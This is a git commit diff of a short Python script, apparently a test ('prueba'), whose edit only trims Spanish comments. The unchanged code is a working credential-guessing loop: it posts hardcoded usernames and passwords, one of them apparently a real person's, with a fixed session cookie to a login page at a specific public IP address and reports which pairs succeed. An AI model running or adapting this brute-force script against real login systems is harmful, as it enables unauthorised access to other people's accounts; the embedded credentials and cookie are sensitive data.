151e024837600285848361cbe339b5c801c23ed4
Jesus Emmanuel Lopez <ing.jesusemmanuel.lm@gmail.com>
2024-12-11 10:26:13 -0600

    Update prueba1.py

--- prueba1.py
+++ prueba1.py
@@ -2,16 +2,16 @@ import sys
 import requests
 from termcolor import colored, cprint
 
-# Cookie de autenticación (asegúrate de que esta cookie sea válida para tu entorno)
+# Cookie
 cookie = {
     "PHPSESSID": "q88d6p0330k5u5fs9ogbemc27a"
 }
 
-# Lista de usuarios y contraseñas directamente en el código
+# Lista 
 usuarios = ["20060001", "user1", "guest"]
 contrasenas = ["Ivanna0709", "password", "admin123"]
 
-# Bucle para probar combinaciones de usuario y contraseña
+# Bucle 
 for usuario in usuarios:
     for contrasena in contrasenas:
         url = "http://35.222.177.84/sigea/index.php"
@@ -20,10 +20,10 @@ for usuario in usuarios:
             "password": contrasena
         }
 
-        # Realizamos la solicitud POST al sitio con las cookies de sesión
+        # Solicitud POST
         response = requests.post(url, data=data, cookies=cookie)
 
-        # Verificamos si la respuesta contiene el mensaje de error o éxito
+        # Respuesta
         if "Username and/or password incorrect." not in response.text:
             cprint(f"[+] {usuario}:{contrasena} es válido", "green", attrs=["bold"], file=sys.stderr)
         else:
